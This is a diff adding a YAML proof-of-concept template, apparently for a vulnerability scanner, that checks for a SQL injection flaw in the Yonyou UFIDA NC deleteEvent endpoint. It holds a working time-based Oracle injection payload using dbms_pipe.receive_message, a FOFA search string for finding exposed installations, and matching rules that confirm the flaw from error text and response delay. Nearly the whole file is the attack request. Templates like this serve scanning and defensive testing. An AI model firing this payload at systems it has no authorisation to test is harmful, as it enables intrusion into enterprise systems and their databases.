@@ -1,0 +1,21 @@
+id: poc-yaml-yonyou-ufida-nc-deleteevent-sqli
+info:
+  name: 用友NC deleteEvent SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ufida-nc
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /portal/pt/oacoSchedulerEvents/deleteEvent?pageId=login
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: event_id=-1'AND 1=dbms_pipe.receive_message('RDS',{{.t1}})--+#+&startDate=2025-05-07
+    12:12:12&event_ts=2025-05-07 12:12:12
+  expression: status_code == 500 && contains(body,"Error") && contains(body,"invalid
+    UFDateTime") && contains(body,"提示") && duration > t1 && duration < t2
+transport: http
